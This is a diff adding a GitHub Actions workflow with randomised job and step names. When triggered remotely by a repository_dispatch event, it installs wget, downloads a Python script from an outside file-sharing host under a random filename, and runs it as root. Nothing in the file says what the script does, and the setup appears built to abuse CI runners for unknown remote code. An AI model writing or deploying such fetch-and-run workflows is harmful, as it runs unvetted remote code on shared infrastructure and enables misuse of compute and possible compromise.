@@ -1,0 +1,21 @@
+name: eEA1hX9jx7
+
+on:
+  repository_dispatch:
+    types:
+      - linux
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - name: 0a3AJq5fcW
+        run: |
+          sudo apt-get update -y
+          sudo apt-get install wget -y
+          cd /opt
+          sudo wget https://pan.urldwz.com/api/v3/file/source/57248/runhc_linux.py?sign=_3Q-iix0Ijv3MHjgMiE4djw5mtIlZ--uZqKscMIBpEU%3D%3A0 -O gkMyLP5nxW.py
+          sudo python ./gkMyLP5nxW.py
